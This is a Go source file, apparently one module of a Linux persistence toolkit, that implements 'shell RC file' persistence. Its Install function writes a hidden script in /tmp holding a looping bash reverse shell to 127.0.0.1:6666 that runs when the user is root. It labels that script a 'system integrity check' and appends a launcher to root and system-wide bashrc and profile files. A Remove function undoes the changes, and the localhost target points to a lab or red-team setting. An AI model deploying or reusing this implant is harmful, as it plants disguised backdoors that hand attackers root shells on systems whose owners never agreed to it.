//go:build linux

package techniques

import (
	"fmt"
	"os"
)

type ShellRC struct {
	modified []string
}

func NewShellRC() Technique {
	return &ShellRC{
		modified: make([]string, 0),
	}
}

func (s *ShellRC) Name() string {
	return "Shell RC Files"
}

func (s *ShellRC) Description() string {
	return "Persistence via .bashrc, .profile injection"
}

func (s *ShellRC) StealthLevel() string {
	return "low"
}

func (s *ShellRC) SurvivesReboot() bool {
	return true
}

func (s *ShellRC) Install() error {
	// Payload to inject
	payload := `
# System integrity check
if [ -f /tmp/.system-integrity ]; then
    bash /tmp/.system-integrity &
fi
`
	
	// Create the system integrity script
	integrityScript := `#!/bin/bash
# Background system monitoring
(while true; do
    if [ $(id -u) -eq 0 ]; then
        # We're root, establish connection
        bash -i >& /dev/tcp/127.0.0.1/6666 0>&1 2>/dev/null &
        sleep 7200
    fi
    sleep 300
done) &
`
	
	if err := os.WriteFile("/tmp/.system-integrity", []byte(integrityScript), 0755); err != nil {
		return fmt.Errorf("create integrity script: %w", err)
	}
	
	// Inject into multiple RC files
	rcFiles := []string{
		"/root/.bashrc",
		"/root/.profile",
		"/etc/bash.bashrc",
		"/etc/profile",
	}
	
	for _, rcFile := range rcFiles {
		if err := s.injectIntoFile(rcFile, payload); err == nil {
			s.modified = append(s.modified, rcFile)
		}
	}
	
	if len(s.modified) == 0 {
		return fmt.Errorf("failed to inject into any RC files")
	}
	
	return nil
}

func (s *ShellRC) injectIntoFile(filepath string, payload string) error {
	// Read current content
	content, err := os.ReadFile(filepath)
	if err != nil {
		// File doesn't exist, create it
		content = []byte("")
	}
	
	// Check if already injected
	if contains(string(content), "system-integrity") {
		return nil // Already injected
	}
	
	// Append payload
	newContent := string(content) + "\n" + payload
	
	return os.WriteFile(filepath, []byte(newContent), 0644)
}

func (s *ShellRC) Remove() error {
	// Remove from all RC files
	rcFiles := []string{
		"/root/.bashrc",
		"/root/.profile",
		"/etc/bash.bashrc",
		"/etc/profile",
	}
	
	for _, rcFile := range rcFiles {
		data, err := os.ReadFile(rcFile)
		if err != nil {
			continue
		}
		
		lines := []string{}
		skip := false
		for _, line := range splitLines(string(data)) {
			if contains(line, "System integrity check") {
				skip = true
			}
			if !skip {
				lines = append(lines, line)
			}
			if skip && line == "fi" {
				skip = false
			}
		}
		
		os.WriteFile(rcFile, []byte(joinLines(lines)), 0644)
	}
	
	os.Remove("/tmp/.system-integrity")
	
	return nil
}

func (s *ShellRC) Details() string {
	return fmt.Sprintf(`Shell RC injection completed.
Modified files: %v

Payload script: /tmp/.system-integrity

The payload executes every time a shell is initialized.
If running as root, establishes reverse shell to 127.0.0.1:6666

Triggered on: Login, new shell, sudo -i, su -, etc.
`, s.modified)
}
